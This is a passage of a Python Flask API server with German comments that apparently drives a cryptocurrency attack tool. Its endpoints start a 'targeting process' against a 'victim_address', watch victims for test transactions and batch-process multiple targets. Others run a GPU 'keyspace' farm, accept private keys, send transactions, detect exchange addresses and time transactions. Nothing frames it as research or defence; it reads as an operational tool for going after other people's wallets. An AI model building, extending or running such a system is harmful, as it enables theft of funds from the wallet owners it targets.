        return jsonify({'success': True, 'queued': [], 'running': [], 'done': [],
                        'message': 'GPU Scaler not configured'})
    return jsonify({'success': True, **gpu_scaler.get_jobs()})

@app.route('/api/gpu/events')
def get_gpu_events():
    """Scale-Event-Historie — wer wann warum skaliert hat."""
    if not gpu_scaler:
        return jsonify({'success': True, 'events': []})
    return jsonify({'success': True,
                    'events': [e.to_dict() for e in gpu_scaler.get_scale_events(30)]})

@app.route('/api/gpu/submit', methods=['POST'])
def submit_gpu_job():
    """Demo-Job an die Farm: echter Keyspace-Benchmark-Batch (lokale Compute)."""
    try:
        if not gpu_scaler:
            return jsonify({'error': 'Zuerst Provider konfigurieren'}), 400
        data = request.get_json(silent=True) or {}
        batch = min(int(data.get('batch', 50000)), 500000)
        job = gpu_scaler.submit_job('keyspace_benchmark', batch)
        threading.Thread(target=_run_gpu_benchmark,
                         args=(job.job_id, batch), daemon=True).start()
        return jsonify({'success': True, 'job': job.to_dict()})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# Chain-Integration Endpoints
@app.route('/api/chain/configure', methods=['POST'])
def configure_chain():
    """Configure Chain Integration"""
    try:
        data = request.get_json(silent=True) or {}
        rpc_url = data.get('rpc_url', 'https://eth.llamarpc.com')
        chain_id = data.get('chain_id', 1)
        private_key = (data.get('private_key') or '').strip()
        demo_key = False

        if not private_key:
            # Demo-Modus: Wegwerf-Key generieren statt 500 — Vorführung läuft weiter
            private_key = '0x' + os.urandom(32).hex()
            demo_key = True
        elif not private_key.startswith('0x'):
            private_key = '0x' + private_key
        if len(private_key) != 66:
            return jsonify({'error': 'Private Key muss 32 Bytes (64 Hex) sein — oder leer lassen für Demo-Key'}), 400
        try:
            demo_address = Account.from_key(private_key).address
        except Exception:
            return jsonify({'error': 'Ungültiger Private Key — außerhalb der secp256k1-Ordnung oder kein Hex'}), 400

        global chain_integration
        chain_config = ChainIntegrationConfig(
            chain_id=chain_id,
            rpc_url=rpc_url,
            name="Ethereum",
            native_currency="ETH",
            block_time_seconds=12
        )
        chain_integration = ChainIntegration([chain_config], private_key)

        resp = {'success': True, 'chain': chain_config.to_dict(),
                'address': demo_address}
        if demo_key:
            resp['demo_key_generated'] = True
            resp['demo_address'] = demo_address
        return jsonify(resp)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/chain/state')
def get_chain_state():
    """Live Chain-State: Block + Gas vom konfigurierten RPC"""
    if not chain_integration:
        return jsonify({'success': True, 'configured': False})
    try:
        chain_id = next(iter(chain_integration.web3_connections), None)
        w3 = chain_integration.web3_connections.get(chain_id)
        if not w3 or not w3.is_connected():
            return jsonify({'success': True, 'configured': True, 'connected': False})
        return jsonify({
            'success': True,
            'configured': True,
            'connected': True,
            'chain_id': chain_id,
            'block_number': w3.eth.block_number,
            'gas_price_gwei': round(w3.eth.gas_price / 1e9, 2),
            'address': chain_integration.account.address
        })
    except Exception as e:
        return jsonify({'success': True, 'configured': True, 'connected': False, 'error': str(e)})

@app.route('/api/chain/send', methods=['POST'])
def send_transaction():
    """Send Transaction"""
    try:
        data = request.get_json(silent=True) or {}
        from_addr = data.get('from_address')
        to_addr = data.get('to_address')
        value = data.get('value', '0x0')
        data_hex = data.get('data', '0x')
        
        if chain_integration:
            tx_request = TransactionRequest(
                from_address=from_addr,
                to_address=to_addr,
                value=value,
                data=data_hex,
                gas_limit=21000,
                chain_id=1
            )
            
            result = run_async_sync(chain_integration.send_transaction(tx_request))
            return jsonify({
                'success': True,
                'result': result.to_dict()
            })
        else:
            return jsonify({'error': 'Chain Integration not configured'}), 400
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/chain/status/<tx_hash>')
def get_transaction_status(tx_hash):
    """Get Transaction Status"""
    try:
        if chain_integration:
            result = run_async_sync(chain_integration.verify_receipt(tx_hash, 1))
            return jsonify({
                'success': True,
                'result': result.to_dict()
            })
        else:
            return jsonify({'error': 'Chain Integration not configured'}), 400
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# Graph Clustering Endpoints
@app.route('/api/graph/cluster', methods=['POST'])
def cluster_graph():
    """Cluster Graph"""
    try:
        data = request.get_json(silent=True) or {}
        transactions = data.get('transactions', [])
        
        graph_clustering.build_graph(transactions)
        clusters = graph_clustering.detect_communities()
        entities = graph_clustering.resolve_entities(transactions)
        
        return jsonify({
            'success': True,
            'clusters': [c.to_dict() for c in clusters],
            'entities': [e.to_dict() for e in entities]
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# Autonomous Agent Endpoints
@app.route('/api/agent/start', methods=['POST'])
def start_agent():
    """Start Autonomous Agent"""
    try:
        run_async(autonomous_agent.start())
        return jsonify({
            'success': True,
            'message': 'Autonomous Agent started'
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/agent/stop', methods=['POST'])
def stop_agent():
    """Stop Autonomous Agent"""
    try:
        run_async(autonomous_agent.stop())
        return jsonify({
            'success': True,
            'message': 'Autonomous Agent stopped'
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/agent/state')
def get_agent_state():
    """Get Agent State"""
    try:
        state = autonomous_agent.get_state()
        return jsonify({
            'success': True,
            'state': state.to_dict()
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/agent/performance')
def get_agent_performance():
    """Get Agent Performance"""
    try:
        limit = request.args.get('limit', 100, type=int)
        performance = autonomous_agent.get_performance(limit)
        return jsonify({
            'success': True,
            'performance': performance
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/agent/exchanges')
def get_exchanges():
    """Get Exchange Database"""
    try:
        exchanges = {name: data.to_dict() for name, data in exchange_detector.exchanges.items()}
        return jsonify({
            'success': True,
            'exchanges': exchanges
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/agent/check-exchange', methods=['POST'])
def check_exchange():
    """Check if Address is Exchange"""
    try:
        data = request.get_json(silent=True) or {}
        address = data.get('address', '')
        
        is_exchange, exchange_name = exchange_detector.is_exchange_address(address)
        
        return jsonify({
            'success': True,
            'is_exchange': is_exchange,
            'exchange_name': exchange_name
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# Targeting Process Endpoints
@app.route('/api/targeting/start', methods=['POST'])
def start_targeting_process():
    """Start Targeting Process"""
    try:
        data = request.get_json(silent=True) or {}
        victim_address = data.get('victim_address', '')
        chains = data.get('chains', ['ethereum'])

        if not victim_address:
            return jsonify({'error': 'Victim address required'}), 400
        if not isinstance(chains, list) or not chains:
            return jsonify({'error': 'chains: nicht-leere Liste erwartet'}), 400
        invalid = [c for c in chains if c not in CHAINS]
        if invalid:
            return jsonify({'error': f'Unbekannte Chains: {invalid} — gültig: {sorted(CHAINS)}'}), 400

        run_async(targeting_process.execute_process(victim_address, chains))

        return jsonify({
            'success': True,
            'message': 'Targeting process started',
            'victim_address': victim_address,
            'chains': chains
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/targeting/status/<process_id>')
def get_targeting_status(process_id):
    """Get Targeting Process Status"""
    try:
        process = targeting_process.get_process(process_id)
        if not process:
            return jsonify({'error': 'Process not found'}), 404
        
        return jsonify({
            'success': True,
            'process': process.to_dict()
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/targeting/status')
def get_current_targeting_status():
    """Get Current Targeting Process Status"""
    try:
        process = targeting_process.get_current_process()
        if not process:
            return jsonify({'error': 'No active process'}), 404
        
        return jsonify({
            'success': True,
            'process': process.to_dict()
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# RPC Connector Endpoints
@app.route('/api/rpc/configure', methods=['POST'])
def configure_rpc():
    """Configure RPC Connector"""
    try:
        data = request.get_json(silent=True) or {}
        providers = data.get('providers', [])
        
        global rpc_connector
        rpc_providers = [RPCProvider(**p) for p in providers]
        rpc_connector = RPCConnector(rpc_providers)
        
        # Live-Feed: echte eth_subscribe-Watcher für Provider mit ws_url
        watched = run_async_sync(_start_live_watcher(rpc_providers), timeout=15)
        
        return jsonify({
            'success': True,
            'providers': [p.to_dict() for p in rpc_providers],
            'live_feed_chains': watched
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/rpc/status')
def get_rpc_status():
    """Get RPC Status"""
    try:
        if rpc_connector:
            statuses = rpc_connector.get_all_statuses()
            return jsonify({
                'success': True,
                'statuses': {str(k): v.to_dict() for k, v in statuses.items()},
                'live_feed': live_feed_active
            })
        else:
            return jsonify({
                'success': True,
                'statuses': {},
                'live_feed': False,
                'message': 'RPC Connector not configured'
            })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# Multi-Agent Coordinator Endpoints
@app.route('/api/agents/configure', methods=['POST'])
def configure_agents():
    """Configure Multi-Agent Coordinator"""
    try:
        data = request.get_json(silent=True) or {}
        node_id = data.get('node_id', 'node_001')
        
        global multi_agent_coordinator
        multi_agent_coordinator = MultiAgentCoordinator(node_id)
        
        return jsonify({
            'success': True,
            'node_id': node_id
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/agents/status')
def get_agents_status():
    """Get Multi-Agent Status"""
    try:
        if multi_agent_coordinator:
            nodes = multi_agent_coordinator.get_node_status()
            leader = multi_agent_coordinator.get_leader()
            return jsonify({
                'success': True,
                'nodes': {k: v.to_dict() for k, v in nodes.items()},
                'leader': leader.to_dict() if leader else None
            })
        else:
            return jsonify({
                'success': True,
                'nodes': {},
                'leader': None,
                'message': 'Multi-Agent Coordinator not configured'
            })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# Policy Attestation Endpoints
@app.route('/api/policy/configure', methods=['POST'])
def configure_policy():
    """Configure Policy Attestation"""
    try:
        data = request.get_json(silent=True) or {}
        verifier_address = data.get('verifier_address', '')
        private_key = data.get('private_key', '')
        
        global policy_attestation
        policy_attestation = PolicyAttestation(verifier_address, private_key)
        
        return jsonify({
            'success': True,
            'verifier_address': verifier_address
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/policy/define', methods=['POST'])
def define_policy():
    """Define Policy"""
    try:
        data = request.get_json(silent=True) or {}
        policy_id = data.get('policy_id', '')
        policy_type = data.get('policy_type', '')
        rules = data.get('rules', {})
        
        if not policy_attestation:
            return jsonify({'error': 'Policy Attestation not configured'}), 400

        try:
            ptype = PolicyType(policy_type)
        except ValueError:
            try:
                ptype = PolicyType[policy_type]
            except KeyError:
                valid = [t.name for t in PolicyType]
                return jsonify({'error': f'Ungültiger policy_type. Gültig: {valid}'}), 400

        policy_attestation.define_policy(policy_id, ptype, rules)
        
        return jsonify({
            'success': True,
            'policy_id': policy_id
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/policy/verify', methods=['POST'])
def verify_policy():
    """Verify Transaction Intent"""
    try:
        data = request.get_json(silent=True) or {}
        intent_data = data.get('intent', {})
        
        if not policy_attestation:
            return jsonify({'error': 'Policy Attestation not configured'}), 400

        required = {'intent_id', 'from_address', 'to_address', 'value', 'data', 'chain_id', 'timestamp', 'policy_types'}
        missing = required - set(intent_data.keys())
        if missing:
            return jsonify({'error': f'Fehlende Intent-Felder: {sorted(missing)}'}), 400

        intent_data['policy_types'] = [PolicyType[t] if isinstance(t, str) else t for t in intent_data['policy_types']]
        if isinstance(intent_data['timestamp'], str):
            intent_data['timestamp'] = datetime.fromisoformat(intent_data['timestamp'].replace('Z', '+00:00'))

        intent = TransactionIntent(**intent_data)
        result = run_async_sync(policy_attestation.verify_transaction(intent))
        
        return jsonify({
            'success': True,
            'result': result.to_dict()
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/policy/status')
def policy_status():
    """Policy Status — Policies, verifizierte PDRs, Violations (Dashboard-Poll)"""
    try:
        if not policy_attestation:
            return jsonify({
                'success': True,
                'policies': {},
                'pdr_registry': {},
                'violations': 0,
                'message': 'Policy Attestation not configured'
            })
        policies = {pid: {'type': p['policy_type'].value,
                          'rules': p['rules']} for pid, p in policy_attestation.policies.items()}
        pdrs = {rid: r.to_dict() for rid, r in policy_attestation.pdr_registry.items()}
        violations = sum(1 for r in policy_attestation.pdr_registry.values()
                         if r.policy_violations)
        return jsonify({
            'success': True,
            'policies': policies,
            'pdr_registry': pdrs,
            'violations': violations
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# Test-TX Detection Endpoints
@app.route('/api/test-tx/detect', methods=['POST'])
def detect_test_tx():
    """Detect Test Transaction"""
    try:
        data = request.get_json(silent=True) or {}
        victim_address = data.get('victim_address', '')

        global test_tx_detector
        if rpc_connector is None:
            return jsonify({
                'success': False,
                'error': 'RPC Connector nicht konfiguriert — zuerst /api/rpc/configure aufrufen'
            }), 400
        if test_tx_detector is None:
            test_tx_detector = TestTXDetector(rpc_connector)

        # Starte Monitoring
        run_async(test_tx_detector.start_monitoring(victim_address))

        return jsonify({
            'success': True,
            'message': 'Test-TX Detection gestartet',
            'victim_address': victim_address
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/test-tx/status/<victim_address>')
def get_test_tx_status(victim_address):
    """Get Test-TX Detection Status"""
    try:
        if test_tx_detector is None:
            return jsonify({
                'success': True,
                'history': [],
                'message': 'Test-TX Detector nicht aktiv'
            })
        history = test_tx_detector.get_detection_history(victim_address)
        return jsonify({
            'success': True,
            'history': [tx.to_dict() for tx in history]
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# Multi-Target Processing Endpoints
@app.route('/api/multi-target/start', methods=['POST'])
def start_multi_target():
    """Start Multi-Target Processing"""
    try:
        data = request.get_json(silent=True) or {}
        targets = data.get('targets', [])
        
        if not targets:
            return jsonify({'error': 'Targets required'}), 400

        global _multi_target_started
        if not _multi_target_started:
            run_async(multi_target_processor.start())
            _multi_target_started = True

        # Starte Multi-Target Processor (synchron — Fehler gehen ans Frontend)
        task_ids = run_async_sync(multi_target_processor.submit_batch(targets))

        return jsonify({
            'success': True,
            'message': 'Multi-Target Processing gestartet',
            'target_count': len(task_ids),
            'task_ids': task_ids
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/multi-target/status')
def get_multi_target_status():
    """Get Multi-Target Status"""
    try:
        status = multi_target_processor.get_status()
        return jsonify({
            'success': True,
            'status': status.to_dict()
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# Timing Optimizer Endpoints
@app.route('/api/timing/optimize', methods=['POST'])
def optimize_timing():
    """Optimize Timing"""
    try:
        data = request.get_json(silent=True) or {}
        # Defaults = typische Ethereum-Mainnet-Bedingungen (Demo)
        defaults = {'block_time_seconds': 12, 'gas_price_gwei': 20.0,
                    'network_congestion': 0.5, 'mempool_size': 150000,
                    'confirmation_depth': 12}
        defaults.update(data.get('network_conditions') or {})
        network_conditions = NetworkConditions(**defaults)
        target_confirmation = data.get('target_confirmation_seconds', 60)
        
        optimization = run_async_sync(timing_optimizer.optimize_timing(network_conditions, target_confirmation))
        
        return jsonify({
            'success': True,
            'optimization': optimization.to_dict()
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    logger.info("API Server gestartet auf http://localhost:5001")
    app.run(host='0.0.0.0', port=5001, debug=os.environ.get('FLASK_DEBUG', '0') == '1')